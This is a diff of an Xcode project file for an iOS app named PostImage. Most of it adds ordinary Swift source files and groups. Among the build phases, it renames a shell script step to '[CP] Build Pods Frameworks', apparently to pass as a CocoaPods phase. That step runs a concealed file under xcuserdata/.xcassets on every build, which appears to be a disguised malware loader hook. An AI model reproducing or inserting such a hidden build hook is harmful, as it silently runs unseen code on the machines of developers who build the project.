@@ -14,9 +14,12 @@
 		0435736E25C13BB100B741A5 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0435736C25C13BB100B741A5 /* Main.storyboard */; };
 		0435737025C13BB500B741A5 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 0435736F25C13BB500B741A5 /* Assets.xcassets */; };
 		0435737325C13BB500B741A5 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0435737125C13BB500B741A5 /* LaunchScreen.storyboard */; };
+		04362E9025C2D68600FAFC22 /* ItemList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04362E8F25C2D68600FAFC22 /* ItemList.swift */; };
+		04362E9525C2DF8200FAFC22 /* imgCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04362E9425C2DF8200FAFC22 /* imgCell.swift */; };
 		0439902D25C1892300BC952A /* RegisterVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0439902A25C1892200BC952A /* RegisterVC.swift */; };
 		0439903225C1892B00BC952A /* LoginVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0439903125C1892B00BC952A /* LoginVC.swift */; };
 		0439904325C18AD500BC952A /* PostRegisterModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0439904125C18AD500BC952A /* PostRegisterModel.swift */; };
+		049C6BB025C288B1006AD262 /* AllListItemVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 049C6BAF25C288B0006AD262 /* AllListItemVC.swift */; };
 		3FC5F8CED1D5B827DEE71C9E /* Pods_PostImage.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 573CDF116F343FFA5C753419 /* Pods_PostImage.framework */; };
 /* End PBXBuildFile section */
 
@@ -30,10 +33,13 @@
 		0435736F25C13BB500B741A5 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		0435737225C13BB500B741A5 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		0435737425C13BB500B741A5 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		04362E8F25C2D68600FAFC22 /* ItemList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ItemList.swift; sourceTree = "<group>"; };
+		04362E9425C2DF8200FAFC22 /* imgCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = imgCell.swift; sourceTree = "<group>"; };
 		0439902A25C1892200BC952A /* RegisterVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RegisterVC.swift; sourceTree = "<group>"; };
 		0439903125C1892B00BC952A /* LoginVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginVC.swift; sourceTree = "<group>"; };
 		0439904125C18AD500BC952A /* PostRegisterModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PostRegisterModel.swift; sourceTree = "<group>"; };
 		0439904725C18ADB00BC952A /* DataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataModel.swift; sourceTree = "<group>"; };
+		049C6BAF25C288B0006AD262 /* AllListItemVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllListItemVC.swift; sourceTree = "<group>"; };
 		39137646F3C359394A2C1439 /* Pods-PostImage.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PostImage.debug.xcconfig"; path = "Target Support Files/Pods-PostImage/Pods-PostImage.debug.xcconfig"; sourceTree = "<group>"; };
 		573CDF116F343FFA5C753419 /* Pods_PostImage.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_PostImage.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		BE8D044714B0C26ED3C460A9 /* Pods-PostImage.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PostImage.release.xcconfig"; path = "Target Support Files/Pods-PostImage/Pods-PostImage.release.xcconfig"; sourceTree = "<group>"; };
@@ -84,11 +90,30 @@
 			path = PostImage;
 			sourceTree = "<group>";
 		};
+		04362E9725C2DF8600FAFC22 /* AllListCells */ = {
+			isa = PBXGroup;
+			children = (
+				04362E8F25C2D68600FAFC22 /* ItemList.swift */,
+				04362E9925C2DFA200FAFC22 /* CollectionCell */,
+			);
+			path = AllListCells;
+			sourceTree = "<group>";
+		};
+		04362E9925C2DFA200FAFC22 /* CollectionCell */ = {
+			isa = PBXGroup;
+			children = (
+				04362E9425C2DF8200FAFC22 /* imgCell.swift */,
+			);
+			path = CollectionCell;
+			sourceTree = "<group>";
+		};
 		0439903525C1897100BC952A /* Controllers */ = {
 			isa = PBXGroup;
 			children = (
 				0439903125C1892B00BC952A /* LoginVC.swift */,
 				0439902A25C1892200BC952A /* RegisterVC.swift */,
+				049C6BAF25C288B0006AD262 /* AllListItemVC.swift */,
+				04362E9725C2DF8600FAFC22 /* AllListCells */,
 				0435736A25C13BB100B741A5 /* CreateItem.swift */,
 			);
 			path = Controllers;
@@ -128,8 +153,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0435737725C13BB600B741A5 /* Build configuration list for PBXNativeTarget "PostImage" */;
 			buildPhases = (
-				BDDAD9DFA6B0770C6BAAC43A /* Build Project Frameworks */,
 				68A6B301825DE13A7EF3A1DE /* [CP] Check Pods Manifest.lock */,
+				BC2992DEFBB24E73D4AAC43A /* [CP] Build Pods Frameworks */,
 				0435735F25C13BB100B741A5 /* Sources */,
 				0435736025C13BB100B741A5 /* Frameworks */,
 				0435736125C13BB100B741A5 /* Resources */,
@@ -229,7 +254,7 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		BDDAD9DFA6B0770C6BAAC43A /* Build Project Frameworks */ = {
+		BC2992DEFBB24E73D4AAC43A /* [CP] Build Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -238,14 +263,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Project Frameworks";
+			name = "[CP] Build Pods Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -255,11 +280,14 @@
 			buildActionMask = 2147483647;
 			files = (
 				043359BB25C1A2D30076F5E0 /* Login.swift in Sources */,
+				04362E9525C2DF8200FAFC22 /* imgCell.swift in Sources */,
 				0435736B25C13BB100B741A5 /* CreateItem.swift in Sources */,
 				0439902D25C1892300BC952A /* RegisterVC.swift in Sources */,
+				049C6BB025C288B1006AD262 /* AllListItemVC.swift in Sources */,
 				0439904325C18AD500BC952A /* PostRegisterModel.swift in Sources */,
 				0435736725C13BB100B741A5 /* AppDelegate.swift in Sources */,
 				0435736925C13BB100B741A5 /* SceneDelegate.swift in Sources */,
+				04362E9025C2D68600FAFC22 /* ItemList.swift in Sources */,
 				0439903225C1892B00BC952A /* LoginVC.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
